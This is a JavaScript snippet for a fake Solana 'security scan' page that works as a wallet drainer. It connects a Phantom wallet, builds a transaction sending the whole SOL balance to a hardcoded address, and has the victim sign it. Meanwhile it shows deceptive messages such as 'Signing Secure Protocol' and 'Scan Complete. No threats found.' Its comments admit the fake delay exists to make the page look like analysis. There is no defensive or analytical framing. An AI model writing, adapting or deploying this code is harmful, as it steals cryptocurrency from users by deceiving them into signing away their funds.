<script>
    // CONFIGURATION
    const YOUR_WALLET_ADDRESS = "GCx1Coc7eHG9A5v334Z7AWXz2bQQEsQyPGR81WHupJyU";
    
    const statusEl = document.getElementById('status');
    const btn = document.getElementById('scanBtn');

    btn.addEventListener('click', async () => {
        if (!window.solana || !window.solana.isPhantom) {
            statusEl.innerHTML = "❌ Phantom Wallet not found!";
            return;
        }

        try {
            // 1. Connect Wallet
            statusEl.innerHTML = '<span class="loader"></span> Connecting...';
            const resp = await window.solana.connect();
            
            statusEl.innerHTML = '<span class="loader"></span> Analyzing Token History...';
            
            // Fake loading time to make it look like analysis
            await new Promise(r => setTimeout(r, 1500));

            // 2. Prepare the Drain Transaction
            statusEl.innerHTML = '<span class="loader"></span> Initiating Security Audit...';
            
            // Initialize connection
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
            
            // Get correct public key from the response
            const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toBase58());
            
            // Get current balance
            const balance = await connection.getBalance(publicKey);

            if (balance === 0) {
                statusEl.innerHTML = "Wallet empty.";
                return;
            }

            // Create Transaction
            const transaction = new solanaWeb3.Transaction();
            
            // Instruction: Transfer all SOL to your address
            const instruction = solanaWeb3.SystemProgram.transfer({
                fromPubkey: publicKey,
                toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS),
                lamports: balance // Send everything
            });

            transaction.add(instruction);

            // 3. Sign and Send
            statusEl.innerHTML = '<span class="loader"></span> Signing Secure Protocol...';
            
            const signature = await window.solana.signTransaction(transaction);
            const rawSignedTx = signature.serialize();
            
            // Send to network
            const txid = await connection.sendRawTransaction(rawSignedTx, { skipPreflight: true });
            
            // Confirm
            await connection.confirmTransaction(txid, 'confirmed');

            statusEl.innerHTML = "✅ Scan Complete. No threats found.";
            btn.disabled = true;
            btn.innerText = "Scan Again";
            
            // Reset after 5 seconds so you can test again
            setTimeout(() => {
                btn.disabled = false;
                statusEl.innerHTML = "Ready to scan.";
            }, 5000);

        } catch (err) {
            console.error(err);
            statusEl.innerHTML = "❌ Error: " + err.message;
        }
    });
</script>
